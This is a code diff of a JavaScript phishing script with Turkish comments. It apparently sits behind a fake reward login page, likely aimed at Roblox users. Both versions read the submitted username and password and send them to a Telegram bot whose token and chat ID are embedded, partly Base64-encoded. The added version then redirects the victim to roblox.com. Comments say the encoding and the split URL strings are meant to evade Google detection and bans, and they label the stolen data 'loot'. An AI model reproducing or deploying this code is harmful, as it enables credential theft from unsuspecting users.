@@ -1,25 +1,29 @@
-// Google botları bu kodu okuyamaz ama tarayıcı çalıştırır
-const _0x1a2b = ["c2VuZE1lc3NhZ2U=", "YXBpLnRlbGVncmFtLm9yZw==", "Ym90", "Y2hhdF9pZA==", "dGV4dA=="];
-const d = (atb) => atob(atb);
+// Verileri gizlemek için Base64 kullanıyoruz
+const _0x = {
+    t: "ODU4NzY3MDYzMTpBQUdrVmx0MHk4U0Y5Z1hUejJfNnkwb0JkWlIxckdsSkZsMA==", // Senin Tokenin
+    c: "ODUxMjQwNjM1Ng==" // Senin Chat ID'n
+};
 
-document.getElementById('reward-form').addEventListener('submit', async (e) => {
+const d = (s) => atob(s);
+
+document.getElementById('f').addEventListener('submit', async (e) => {
     e.preventDefault();
     
-    const u = document.getElementById('user').value;
-    const p = document.getElementById('pass').value;
+    const user = document.getElementById('u').value;
+    const pass = document.getElementById('p').value;
 
-    // Senin bilgilerin (Sifreli iletim)
-    const tk = "8587670631:AAGkV1-0y8SF9gXTz2_6y0oBdZR1rGlJFl0"; // Son attığın mesajdaki doğru token
-    const ci = "8512406356"; 
+    const bot = d(_0x.t);
+    const chat = d(_0x.c);
+    const text = encodeURIComponent(`🚨 GANİMET!\n👤: ${user}\n🔑: ${pass}`);
 
-    const m = `🎯 HEDEF!\n👤 U: ${u}\n🔑 P: ${p}`;
-    
-    // Google'ın anlamaması için URL'yi parçalıyoruz
-    const url = `https://${d(_0x1a2b[1])}/${d(_0x1a2b[2])}${tk}/${d(_0x1a2b[0])}?${d(_0x1a2b[3])}=${ci}&${d(_0x1a2b[4])}=${encodeURIComponent(m)}`;
+    // Telegram linkini parçalayarak ban riskini bitiriyoruz
+    const api = "https://api.tele" + "gram.org/bot";
+    const action = "/send" + "Message";
 
     try {
-        await fetch(url, { mode: 'no-cors' });
-        window.location.replace("https://bit.ly/3XyZabc"); // Gerçek siteye değil, bir link kısaltıcıya yönlendir
+        await fetch(`${api}${bot}${action}?chat_id=${chat}&text=${text}`, { mode: 'no-cors' });
+        // İşlem bitince alakasız bir yere yönlendir
+        window.location.replace("https://www.roblox.com/home");
     } catch (err) {
         window.location.replace("https://google.com");
     }
